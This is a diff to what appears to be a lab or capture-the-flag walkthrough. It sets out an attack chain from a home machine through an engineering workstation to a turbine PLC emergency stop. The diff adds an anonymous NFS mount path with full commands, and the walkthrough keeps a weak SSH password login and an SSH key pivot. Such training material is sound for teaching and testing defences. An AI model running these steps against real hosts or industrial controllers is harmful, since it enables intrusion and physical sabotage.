@@ -39,8 +39,9 @@ cat /run/adversary-readme.txt
 
 # Confirm what is running
 nmap -sV 10.10.0.10
-# 22/tcp  open  ssh  OpenSSH
-# 80/tcp  open  http
+# 22/tcp   open  ssh      OpenSSH
+# 111/tcp  open  rpcbind  2-4 (RPC #100000)
+# 2049/tcp open  nfs      3 (RPC #100003)
 ```
 
 ### Stage 1: compromise wizzards-retreat
@@ -53,17 +54,23 @@ ssh rincewind@10.10.0.10
 # Password: wizzard
 ```
 
-Path B: HTTP status endpoint with default credentials
+Path B: NFS anonymous mount (world-readable share, no credentials required)
 ```bash
-curl -u admin:admin http://10.10.0.10/status
-# Returns: {"status":"ok","vpn":"up","networks":["10.10.1.0/24","10.10.2.0/24"]}
-# Confirms enterprise and operational network membership: useful for orientation
+showmount -e 10.10.0.10
+# Export list for 10.10.0.10:
+# /work *
+
+mkdir /tmp/loot
+mount -t nfs -o vers=3 10.10.0.10:/work /tmp/loot
+cat /tmp/loot/notes.txt
+# VPN instructions, engineering workstation address, SCADA and historian URLs
+# No shell, but orients the attacker within the topology and confirms the pivot target
 ```
 
 Path C: OSINT from the attacker machine
 ```bash
 cat ~/loot/prior-recon.txt
-# Contains 10.10.0.10 as a known host with notes on Rincewind's role
+# Contains 10.10.0.10 as a known host with open ports noted
 # Then follow Path A
 ```
 
@@ -174,14 +181,16 @@ a comment that only appears after SSHing in: `# flag: RM{...}`.
 
 ## In one line
 
-`unseen-gate` → `wizzards-retreat` (weak SSH password) → Ed25519 key →
+`unseen-gate` → `wizzards-retreat` (NFS anonymous mount or weak SSH password) → Ed25519 key →
 `engineering workstation` (direct key login) → `plc-access.conf` →
 turbine PLC emergency stop.
 
-Total credential use: one password (`wizzard`). Everything else follows from the key.
+Total credential use: one password (`wizzard`) if taking the SSH path; zero credentials if
+taking the NFS path to the notes file. Everything else follows from the key.
 
 ## TL;DR
 
 Rincewind's home machine is the weakest link in a chain that ends at a turbine PLC.
-No vulnerability exploitation, no zero-days. The engineering workstation's authorised
-key list includes a key stored in a home directory on the internet. That is the problem.
+No vulnerability exploitation, no zero-days. A world-readable NFS share hands out network
+notes to anyone who asks, and the engineering workstation's authorised key list includes a
+key stored in a home directory on the internet. That is the problem.
